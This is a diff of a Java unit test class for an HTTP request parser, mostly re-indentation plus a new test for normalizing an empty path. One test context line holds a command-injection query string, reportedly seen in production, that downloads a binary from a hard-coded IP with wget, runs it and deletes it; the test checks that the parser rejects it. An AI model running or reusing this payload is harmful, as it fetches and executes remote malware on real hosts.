@@ -70,8 +70,8 @@ class RequestParserTest {
         assertThat(parser.httpMethod("POST")).isEqualTo(HTTPMethod.POST);
 
         assertThatThrownBy(() -> parser.httpMethod("TRACK"))
-                .isInstanceOf(MethodNotAllowedException.class)
-                .hasMessageContaining("method=TRACK");
+            .isInstanceOf(MethodNotAllowedException.class)
+            .hasMessageContaining("method=TRACK");
     }
 
     @Test
@@ -85,7 +85,7 @@ class RequestParserTest {
         var request = new RequestImpl(null, null);
         // undertow url decoding is disabled in core.framework.internal.web.HTTPServer.start, so the parser must decode all query param
         Map<String, Deque<String>> params = Map.of("key", new ArrayDeque<>(List.of(encode("value1 value2", UTF_8))),
-                "emptyKey", new ArrayDeque<>(List.of("")));  // for use case: http://address?emptyKey=
+            "emptyKey", new ArrayDeque<>(List.of("")));  // for use case: http://address?emptyKey=
         parser.parseQueryParams(request, params);
 
         assertThat(request.queryParams()).containsOnly(entry("key", "value1 value2"), entry("emptyKey", ""));
@@ -98,8 +98,8 @@ class RequestParserTest {
         // the query string is from actual cases of production
         Map<String, Deque<String>> params = Map.of("cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo", new ArrayDeque<>(List.of("")));
         assertThatThrownBy(() -> parser.parseQueryParams(request, params))
-                .isInstanceOf(BadRequestException.class)
-                .hasMessageContaining("failed to parse query param");
+            .isInstanceOf(BadRequestException.class)
+            .hasMessageContaining("failed to parse query param");
     }
 
     @Test
@@ -136,8 +136,8 @@ class RequestParserTest {
         exchange.putAttachment(RequestBodyReader.REQUEST_BODY, new RequestBodyReader.RequestBody(null, new IOException()));
 
         assertThatThrownBy(() -> parser.parseBody(request, exchange))
-                .isInstanceOf(BadRequestException.class)
-                .satisfies(e -> assertThat(((ErrorCode) e).errorCode()).isEqualTo("FAILED_TO_READ_HTTP_REQUEST"));
+            .isInstanceOf(BadRequestException.class)
+            .satisfies(e -> assertThat(((ErrorCode) e).errorCode()).isEqualTo("FAILED_TO_READ_HTTP_REQUEST"));
     }
 
     @Test
@@ -151,7 +151,7 @@ class RequestParserTest {
         request.port = 443;
 
         assertThat(parser.requestURL(request, exchange))
-                .isEqualTo("https://localhost/path?key=value");
+            .isEqualTo("https://localhost/path?key=value");
     }
 
     @Test
@@ -170,16 +170,16 @@ class RequestParserTest {
         // refer to io.undertow.UndertowMessages.tooManyCookies
         // refer to io.undertow.UndertowMessages.couldNotParseCookie
         when(exchange.requestCookies())
-                .thenThrow(new IllegalStateException("UT000046: The number of cookies sent exceeded the maximum of 200"))
-                .thenThrow(new IllegalArgumentException("UT000069: Could not parse set cookie header value"));
+            .thenThrow(new IllegalStateException("UT000046: The number of cookies sent exceeded the maximum of 200"))
+            .thenThrow(new IllegalArgumentException("UT000069: Could not parse set cookie header value"));
 
         assertThatThrownBy(() -> parser.parseCookies(null, exchange))
-                .isInstanceOf(BadRequestException.class)
-                .satisfies(e -> assertThat(((BadRequestException) e).errorCode()).isEqualTo("INVALID_COOKIE"));
+            .isInstanceOf(BadRequestException.class)
+            .satisfies(e -> assertThat(((BadRequestException) e).errorCode()).isEqualTo("INVALID_COOKIE"));
 
         assertThatThrownBy(() -> parser.parseCookies(null, exchange))
-                .isInstanceOf(BadRequestException.class)
-                .satisfies(e -> assertThat(((BadRequestException) e).errorCode()).isEqualTo("INVALID_COOKIE"));
+            .isInstanceOf(BadRequestException.class)
+            .satisfies(e -> assertThat(((BadRequestException) e).errorCode()).isEqualTo("INVALID_COOKIE"));
     }
 
     @Test
@@ -231,13 +231,36 @@ class RequestParserTest {
         request.scheme = "http";
         request.port = 80;
         assertThatThrownBy(() -> parser.parse(request, exchange, actionLog))
-                .isInstanceOf(BadRequestException.class)
-                .hasMessageContaining("requestURL is too long");
+            .isInstanceOf(BadRequestException.class)
+            .hasMessageContaining("requestURL is too long");
+    }
+
+    @Test
+    void parseWithEmptyPath() throws Throwable {
+        /*
+        according to https://www.rfc-editor.org/rfc/rfc2616#section-5.1.2, empty path must be normalized as '/'
+        browser and http client normalize before sending, it can only be reproduced by raw http request,  e.g.
+            nc localhost 8080
+            GET ?dev=true HTTP/1.1
+            Host: localhost
+        */
+        var actionLog = new ActionLog(null, null);
+        HttpServerExchange exchange = exchange(Methods.GET);
+        exchange.setRequestPath("");
+        exchange.setQueryString("query=true");
+
+        var request = new RequestImpl(exchange, null);
+        request.scheme = "http";
+        request.port = 80;
+        parser.parse(request, exchange, actionLog);
+
+        assertThat(request.path()).isEqualTo("/");
     }
 
     private HttpServerExchange exchange(HttpString method) {
         var exchange = new HttpServerExchange(null);
         exchange.setRequestMethod(method);
+        exchange.setRequestPath("/");
         exchange.getRequestHeaders().put(Headers.HOST, "localhost");
         exchange.setDestinationAddress(new InetSocketAddress(80));
         exchange.setSourceAddress(new InetSocketAddress(10000));
